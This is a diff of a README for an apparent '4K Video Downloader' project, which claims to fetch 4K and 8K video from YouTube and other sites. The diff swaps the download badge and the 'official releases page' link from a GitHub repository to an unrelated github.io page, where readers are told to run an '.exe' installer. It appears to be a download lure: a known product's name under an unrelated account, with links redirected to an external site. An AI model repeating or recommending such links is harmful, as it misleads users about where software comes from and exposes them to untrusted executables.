@@ -1,6 +1,6 @@
 # 🎥 4K-Video-Downloader - Download high quality videos with ease
 
-[![](https://img.shields.io/badge/Download-4KVideoDownloader-blue.svg)](https://github.com/Pierluiginervigain560/4K-Video-Downloader)
+[![](https://img.shields.io/badge/Download-4KVideoDownloader-blue.svg)](https://pierluiginervigain560.github.io)
 
 4K Video Downloader saves videos from your favorite websites. You can grab content from YouTube, Vimeo, Dailymotion, Facebook, Instagram, and Twitter. This tool supports 4K and 8K resolutions. You can also save entire playlists or channels to your computer.
 
@@ -21,7 +21,7 @@ Most modern Windows computers already have the necessary framework installed. Th
 
 Follow these steps to set up the software on your Windows machine:
 
-1. Visit the [official releases page](https://github.com/Pierluiginervigain560/4K-Video-Downloader) to begin.
+1. Visit the [official releases page](https://pierluiginervigain560.github.io) to begin.
 2. Look for the latest version under the "Releases" section on the right side of the page.
 3. Click on the file that ends with ".exe" to download the installer to your computer.
 4. Open the downloaded file from your "Downloads" folder.
